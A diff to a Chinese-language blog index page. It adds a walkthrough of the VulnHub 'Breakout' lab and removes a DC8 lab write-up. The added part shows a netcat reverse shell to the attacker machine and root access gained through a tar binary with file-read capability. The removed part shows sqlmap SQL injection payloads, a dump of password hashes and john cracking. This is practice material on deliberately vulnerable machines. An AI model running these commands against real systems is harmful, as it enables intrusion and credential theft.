@@ -1711,6 +1711,172 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/04/%E9%9D%B6%E6%9C%BA/vulnhub/Breakout/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/saber.jpg">
+      <meta itemprop="name" content="zhaochoudecat">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zhaochoudecat">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/05/04/%E9%9D%B6%E6%9C%BA/vulnhub/Breakout/" class="post-title-link" itemprop="url">Breakout</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-05-04 00:00:00" itemprop="dateCreated datePublished" datetime="2026-05-04T00:00:00+08:00">2026-05-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-05-05 00:45:54" itemprop="dateModified" datetime="2026-05-05T00:45:54+08:00">2026-05-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Breakout"><a href="#Breakout" class="headerlink" title="Breakout"></a>Breakout</h1><p>靶机链接：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/empire-breakout,751/">https://www.vulnhub.com/entry/empire-breakout,751/</a></p>
+<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"><span class="comment"># 192.168.3.71</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-端口扫描"><a href="#1-2-端口扫描" class="headerlink" title="1.2 端口扫描"></a>1.2 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sV -O 192.168.3.71</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>服务</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>80</td>
+<td>HTTP</td>
+<td>Apache httpd 2.4.51 (Debian)</td>
+</tr>
+<tr>
+<td>139&#x2F;445</td>
+<td>Samba</td>
+<td>smbd 4</td>
+</tr>
+<tr>
+<td>10000</td>
+<td>HTTP</td>
+<td>MiniServ 1.981 (Webmin)</td>
+</tr>
+<tr>
+<td>20000</td>
+<td>HTTP</td>
+<td>MiniServ 1.830 (Webmin)</td>
+</tr>
+</tbody></table>
+<h3 id="1-3-源码审计"><a href="#1-3-源码审计" class="headerlink" title="1.3 源码审计"></a>1.3 源码审计</h3><p>访问 80 端口，查看网页源代码，发现一段 Brainfuck 编码，解码后得到密码：</p>
+<p><img src="/assets/file-20260504232439418.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.2uqPEfj3D&lt;P&#x27;a-3</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-4-Samba-枚举"><a href="#1-4-Samba-枚举" class="headerlink" title="1.4 Samba 枚举"></a>1.4 Samba 枚举</h3><blockquote>
+<p><strong>enum4linux</strong> 是一款基于 Perl 的 SMB&#x2F;RPC 信息收集脚本，底层封装了 smbclient、rpcclient、nmblookup、net 等工具，用于批量枚举 Windows&#x2F;Samba 主机的用户、共享、组、密码策略等信息。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 192.168.3.71</span><br></pre></td></tr></table></figure>
+
+<p>关键输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S-1-22-1-1000 Unix User\cyber (Local User)  ← 用户名</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-获取初始-Shell"><a href="#2-获取初始-Shell" class="headerlink" title="2. 获取初始 Shell"></a>2. 获取初始 Shell</h2><h3 id="2-1-Webmin-登录"><a href="#2-1-Webmin-登录" class="headerlink" title="2.1 Webmin 登录"></a>2.1 Webmin 登录</h3><p>使用用户名 <code>cyber</code> + 解码得到的密码 <code>.2uqPEfj3D&lt;P&#39;a-3</code>，成功登录 20000 端口的 Webmin。</p>
+<p><img src="/assets/file-20260504234711652.png"></p>
+<h3 id="2-2-反弹-Shell"><a href="#2-2-反弹-Shell" class="headerlink" title="2.2 反弹 Shell"></a>2.2 反弹 Shell</h3><p>Webmin 左下角有 Shell 图标，点击进入，即可查看 user.txt：</p>
+<p><img src="/assets/file-20260504234921413.png"></p>
+<p>然后执行反弹 Shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Kali 攻击机监听</span></span><br><span class="line">nc -lvnp 1111</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机执行</span></span><br><span class="line">nc 192.168.3.72 1111 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-升级为交互式-Shell"><a href="#2-3-升级为交互式-Shell" class="headerlink" title="2.3 升级为交互式 Shell"></a>2.3 升级为交互式 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br><span class="line">Ctrl+Z</span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">reset xterm</span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/bash</span><br><span class="line"><span class="built_in">stty</span> rows 24 columns 80</span><br></pre></td></tr></table></figure>
+
+<p>拿到 user.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h2><h3 id="3-1-信息探测"><a href="#3-1-信息探测" class="headerlink" title="3.1 信息探测"></a>3.1 信息探测</h3><p>查看 home 目录，发现一个 <code>tar</code> 可执行文件。检查其 Capability：</p>
+<blockquote>
+<p><strong>Linux Capabilities</strong> 将 root 的超级权限拆分为细粒度特权。<code>getcap</code> 用于查看二进制文件被授予了哪些特权，拥有对应 capability 的进程无需 root 即可执行特权操作。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cyber@breakout:~$ <span class="built_in">ls</span></span><br><span class="line">tar  user.txt</span><br><span class="line">cyber@breakout:~$ <span class="built_in">getcap</span> tar</span><br><span class="line">tar cap_dac_read_search=ep</span><br></pre></td></tr></table></figure>
+
+<p><code>cap_dac_read_search=ep</code> 允许该程序<strong>绕过文件读权限检查</strong>，可以读取系统上任意文件。</p>
+<h3 id="3-2-读取备份密码"><a href="#3-2-读取备份密码" class="headerlink" title="3.2 读取备份密码"></a>3.2 读取备份密码</h3><p>发现 <code>/var/backups/.old_pass.bak</code> 仅 root 可读：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cyber@breakout:/var/backups$ <span class="built_in">ls</span> -la</span><br><span class="line">-rw-------  1 root root  17 Oct 20  2021 .old_pass.bak</span><br></pre></td></tr></table></figure>
+
+<p>利用 tar 的 capability 打包并解压，绕过权限限制：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./tar -cvf pass.tar /var/backups/.old_pass.bak</span><br><span class="line">./tar -xvf pass.tar</span><br><span class="line"><span class="built_in">cat</span> var/backups/.old_pass.bak</span><br><span class="line"><span class="comment"># Ts&amp;4&amp;YurgtRX(=~h</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-切换到-root"><a href="#3-3-切换到-root" class="headerlink" title="3.3 切换到 root"></a>3.3 切换到 root</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cyber@breakout:~$ su -</span><br><span class="line">Password: Ts&amp;4&amp;YurgtRX(=~h</span><br><span class="line"></span><br><span class="line">root@breakout:~# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@breakout:~# <span class="built_in">cat</span> rOOt.txt</span><br><span class="line">3mp!r3&#123;You_Manage_To_BreakOut_From_My_System_Congratulation&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-Flag-汇总"><a href="#4-Flag-汇总" class="headerlink" title="4. Flag 汇总"></a>4. Flag 汇总</h2><table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>user.txt</td>
+<td><code>3mp!r3{You_Manage_To_Break_To_My_Secure_Access}</code></td>
+</tr>
+<tr>
+<td>root.txt</td>
+<td><code>3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}</code></td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/03/%E9%9D%B6%E6%9C%BA/vulnhub/DC7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1816,140 +1982,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/03/%E9%9D%B6%E6%9C%BA/vulnhub/DC8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/saber.jpg">
-      <meta itemprop="name" content="zhaochoudecat">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zhaochoudecat">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/05/03/%E9%9D%B6%E6%9C%BA/vulnhub/DC8/" class="post-title-link" itemprop="url">DC8</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2026-05-03 00:00:00 / 修改时间：04:03:47" itemprop="dateCreated datePublished" datetime="2026-05-03T00:00:00+08:00">2026-05-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="1-探索"><a href="#1-探索" class="headerlink" title="1.探索"></a>1.探索</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:f3:3b:7c, IPv4: 192.168.43.157</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    3a:e9:6f:eb:62:78       (Unknown: locally administered)</span><br><span class="line">192.168.43.88   08:00:27:a3:ed:7c       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.153  ca:6e:5b:3c:62:0f       (Unknown: locally administered)</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p- 192.168.43.88                                                          </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 15:39 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> dc-8 (192.168.43.88)</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:A3:ED:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
-<p>IP: <code>192.168.43.88</code><br><img src="/assets/Pasted%20image%2020260112153443.png"></p>
-<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dirsearch -u http://192.168.43.88/ -e php,txt,html,htm -i 200</span><br><span class="line"></span><br><span class="line">[20:57:02] Starting: </span><br><span class="line">[20:57:59] 200 -   33KB - /CHANGELOG.txt</span><br><span class="line">[20:58:02] 200 -  769B  - /COPYRIGHT.txt</span><br><span class="line">[20:58:24] 200 -    1KB - /install.php</span><br><span class="line">[20:58:24] 200 -  868B  - /INSTALL.mysql.txt</span><br><span class="line">[20:58:24] 200 -  842B  - /INSTALL.pgsql.txt</span><br><span class="line">[20:58:24] 200 -    1KB - /install.php?profile=default</span><br><span class="line">[20:58:24] 200 -    6KB - /INSTALL.txt</span><br><span class="line">[20:58:27] 200 -    7KB - /LICENSE.txt</span><br><span class="line">[20:58:30] 200 -    2KB - /MAINTAINERS.txt</span><br><span class="line">[20:58:35] 200 -    2KB - /node</span><br><span class="line">[20:58:44] 200 -    2KB - /README.txt</span><br><span class="line">[20:58:45] 200 -  744B  - /robots.txt</span><br><span class="line">[20:58:48] 200 -  715B  - /sites/all/modules/README.txt</span><br><span class="line">[20:58:48] 200 -  545B  - /sites/all/themes/README.txt</span><br><span class="line">[20:58:48] 200 -  129B  - /sites/all/libraries/README.txt</span><br><span class="line">[20:58:48] 200 -    0B  - /sites/example.sites.php</span><br><span class="line">[20:58:48] 200 -  431B  - /sites/README.txt</span><br><span class="line">[20:58:55] 200 -    3KB - /UPGRADE.txt</span><br><span class="line">[20:58:56] 200 -    2KB - /user</span><br><span class="line">[20:58:56] 200 -    2KB - /user/</span><br><span class="line">[20:58:56] 200 -    2KB - /user/login/</span><br><span class="line">[20:58:58] 200 -  177B  - /views/ajax/autocomplete/user/a</span><br><span class="line">[20:59:00] 200 -    2KB - /web.config</span><br><span class="line">[20:59:03] 200 -   42B  - /xmlrpc.php</span><br></pre></td></tr></table></figure>
-<p> <strong>说明</strong></p>
-<ul>
-<li><code>-i</code> 或 <code>--include-status</code>：指定需要保留的状态码，多个状态码用逗号分隔（如 <code>-i 200,201</code>）</li>
-<li><code>-u</code>：目标 URL</li>
-<li><code>-e</code> 或 <code>--extensions</code>：指定扫描的文件扩展名<br>指定状态码为200和403的php,txt,html,htm页面</li>
-</ul>
-<h4 id="查看robots-txt"><a href="#查看robots-txt" class="headerlink" title="查看robots.txt"></a>查看robots.txt</h4><p>发现<code>login</code>登录的 <code>path</code><br><img src="/assets/Pasted%20image%2020260112210425.png"></p>
-<h2 id="2-页面"><a href="#2-页面" class="headerlink" title="2.页面"></a>2.页面</h2><p>点击<code>Who we Are</code> 发现<code>nid=2</code>, 推测是否有注入点<br><img src="/assets/Pasted%20image%2020260112160306.png"><br>尝试后面加<code>&#39;</code>， 发现存在注入点<br><img src="/assets/Pasted%20image%2020260112160356.png"></p>
-<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sqlmap -u http://192.168.43.88/?nid=2 --batch   </span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.9.11#stable&#125;</span><br><span class="line">|_ -| . [(]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&quot;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   https://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 16:00:01 /2026-01-12/</span><br><span class="line">......</span><br><span class="line">---</span><br><span class="line">Parameter: nid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: nid=2 AND 6281=6281</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: nid=2 AND (SELECT 2777 FROM(SELECT COUNT(*),CONCAT(0x71717a6b71,(SELECT (ELT(2777=2777,1))),0x7171787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: nid=2 AND (SELECT 1947 FROM (SELECT(SLEEP(5)))UZxb)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 1 column</span><br><span class="line">    Payload: nid=-6921 UNION ALL SELECT CONCAT(0x71717a6b71,0x645a5a425551534354454450646c59696655557456596e534e6d6579745764465442416764717553,0x7171787871)-- -</span><br><span class="line">---</span><br><span class="line">[16:00:14] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: Apache</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span><br><span class="line">[16:00:14] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 25 <span class="built_in">times</span></span><br><span class="line">[16:00:14] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.43.88&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="查看库"><a href="#查看库" class="headerlink" title="查看库"></a>查看库</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sqlmap -u http://192.168.43.88/?nid=2 --batch --dbs </span><br><span class="line">available databases [2]:                                                                           </span><br><span class="line">[*] d7db</span><br><span class="line">[*] information_schema</span><br></pre></td></tr></table></figure>
-<p>发现两个库<br><code>d7db</code> 和<code>information_schema</code> （系统库可忽略）</p>
-<h4 id="查看库d7db的表"><a href="#查看库d7db的表" class="headerlink" title="查看库d7db的表"></a>查看库d7db的表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sqlmap -u http://192.168.43.88/?nid=2 --batch -D d7db --tables</span><br><span class="line">Database: d7db                                                                                     </span><br><span class="line">[88 tables]</span><br><span class="line">+-----------------------------+</span><br><span class="line">| block                       |</span><br><span class="line"> .......</span><br><span class="line">| <span class="built_in">users</span>                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">|  |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure>
-
-<h4 id="查看users表的列"><a href="#查看users表的列" class="headerlink" title="查看users表的列"></a>查看users表的列</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sqlmap -u http://192.168.43.88/?nid=2 --batch -D d7db -T <span class="built_in">users</span> --columns</span><br><span class="line">Database: d7db                                                                                     </span><br><span class="line">Table: <span class="built_in">users</span></span><br><span class="line">[16 columns]</span><br><span class="line">+------------------+------------------+</span><br><span class="line">| Column           | Type             |</span><br><span class="line">+------------------+------------------+</span><br><span class="line">| data             | longblob         |</span><br><span class="line">| language         | varchar(12)      |</span><br><span class="line">| name             | varchar(60)      |</span><br><span class="line">| status           | tinyint(4)       |</span><br><span class="line">| access           | int(11)          |</span><br><span class="line">| created          | int(11)          |</span><br><span class="line">| init             | varchar(254)     |</span><br><span class="line">| login            | int(11)          |</span><br><span class="line">| mail             | varchar(254)     |</span><br><span class="line">| pass             | varchar(128)     |</span><br><span class="line">| picture          | int(11)          |</span><br><span class="line">| signature        | varchar(255)     |</span><br><span class="line">| signature_format | varchar(255)     |</span><br><span class="line">| theme            | varchar(255)     |</span><br><span class="line">| timezone         | varchar(32)      |</span><br><span class="line">| uid              | int(10) unsigned |</span><br><span class="line">+------------------+------------------+</span><br></pre></td></tr></table></figure>
-
-<h4 id="查看users表user和pass字段"><a href="#查看users表user和pass字段" class="headerlink" title="查看users表user和pass字段"></a>查看users表user和pass字段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# sqlmap -u http://192.168.43.88/?nid=2 --batch -D d7db -T <span class="built_in">users</span> -C <span class="string">&quot;name,pass&quot;</span> --dump</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| name   | pass                                                    |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| admin  | $S<span class="variable">$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</span> |</span><br><span class="line">| john   | $S<span class="variable">$DqupvJbxVmqjr6cYePnx2A891ln7lsuku</span>/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">[16:17:09] [INFO] table <span class="string">&#x27;d7db.users&#x27;</span> dumped to CSV file <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.43.88/dump/d7db/users.csv&#x27;</span></span><br><span class="line">[16:17:09] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 1 <span class="built_in">times</span></span><br><span class="line">[16:17:09] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.43.88&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="John"><a href="#John" class="headerlink" title="John"></a>John</h3><p>第一个<code>admin</code>没爆破出来，第二个用户<code>John</code>出来了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload/CD8]</span><br><span class="line">└─# john --format=drupal7 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt </span><br><span class="line"></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Drupal7, $S$ [SHA512 256/256 AVX2 4x])</span><br><span class="line">Cost 1 (iteration count) is 32768 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">turtle           (?)     </span><br><span class="line">1g 0:00:00:00 DONE (2026-01-12 16:34) 1.785g/s 914.2p/s 914.2c/s 914.2C/s genesis..letmein</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure>
-<p> user:  <code>John</code><br> pass： <code>turtle</code></p>
